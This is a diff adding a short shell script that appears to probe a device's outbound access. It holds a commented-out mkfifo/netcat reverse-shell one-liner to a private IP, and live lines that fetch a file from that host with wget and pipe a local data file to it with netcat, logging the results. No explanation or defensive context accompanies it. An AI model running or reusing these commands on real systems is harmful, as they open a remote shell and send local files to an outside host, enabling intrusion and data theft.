@@ -1,0 +1,9 @@
+#!/bin/sh
+
+#mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.27.35.7 1111 >/tmp/f
+
+/bin/touch /data/test2222
+result1=$(/bin/wget -O /data/wgettest2222 http://172.27.35.7:8000/wgettest)
+/bin/echo $result1 > /data/wgetinfo2222
+result2=$(/usr/bin/nc 172.27.35.7 2222 < /data/tmp.txt)
+/bin/echo $result2 > /data/ncinfo2222
